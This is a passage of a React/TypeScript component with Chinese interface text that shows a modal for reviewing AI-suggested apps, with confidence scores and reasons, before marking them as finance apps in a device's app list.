              setSelectedPackages(
                candidates
                  .filter((item) => item.selectedByDefault)
                  .map((item) => item.packageName),
              )
            }
          >
            全选高置信
          </Button>,
          <Button
            key="all"
            disabled={applyingMarks}
            onClick={() =>
              setSelectedPackages(candidates.map((item) => item.packageName))
            }
          >
            全选
          </Button>,
          <Button
            key="cancel"
            disabled={applyingMarks}
            onClick={() => setConfirmOpen(false)}
          >
            取消
          </Button>,
          <Button
            key="ok"
            type="primary"
            loading={applyingMarks}
            onClick={() => void handleConfirmAiMarks()}
          >
            确认标记为金融 ({selectedPackages.length})
          </Button>,
        ]}
      >
        <p className="device-app-list-hint">
          仅分析默认应用中的非系统、未标记项。置信度 ≥ 0.8 默认勾选；确认后写入全局金融标记。
        </p>
        <Table
          size="small"
          rowKey="packageName"
          pagination={false}
          scroll={{ y: 360 }}
          dataSource={candidates}
          columns={[
            {
              title: (
                <Checkbox
                  checked={
                    candidates.length > 0 &&
                    selectedPackages.length === candidates.length
                  }
                  indeterminate={
                    selectedPackages.length > 0 &&
                    selectedPackages.length < candidates.length
                  }
                  onChange={(event) => {
                    setSelectedPackages(
                      event.target.checked
                        ? candidates.map((item) => item.packageName)
                        : [],
                    );
                  }}
                />
              ),
              width: 48,
              render: (_: unknown, row: FinanceAnalyzeCandidate) => (
                <Checkbox
                  checked={selectedPackages.includes(row.packageName)}
                  onChange={(event) => {
                    setSelectedPackages((current) => {
                      if (event.target.checked) {
                        return current.includes(row.packageName)
                          ? current
                          : [...current, row.packageName];
                      }
                      return current.filter((pkg) => pkg !== row.packageName);
                    });
                  }}
                />
              ),
            },
            {
              title: "应用",
              dataIndex: "label",
              ellipsis: true,
            },
            {
              title: "包名",
              dataIndex: "packageName",
              ellipsis: true,
            },
            {
              title: "置信度",
              dataIndex: "confidence",
              width: 88,
              render: (value: number) => value.toFixed(2),
            },
            {
              title: "原因",
              dataIndex: "reason",
              ellipsis: true,
            },
          ]}
        />
      </Modal>
      </>
  );

  if (embedded) {
    if (!open) {
      return null;
    }
    return (
      <div className="device-app-list-embedded">
        <div className="device-app-list-embedded-head">
          <span>{deviceLabel ? `应用列表 - ${deviceLabel}` : "应用列表"}</span>
          <Button type="link" onClick={onClose}>
            关闭
          </Button>
        </div>
        {listBody}
      </div>
    );
  }

  return (
    <Modal
      title={deviceLabel ? `应用列表 - ${deviceLabel}` : "应用列表"}
      open={open}
      onCancel={onClose}
      footer={null}
      width={900}
      centered={false}
      destroyOnClose
      className="device-app-list-modal"
    >
      {listBody}
    </Modal>
  );
}
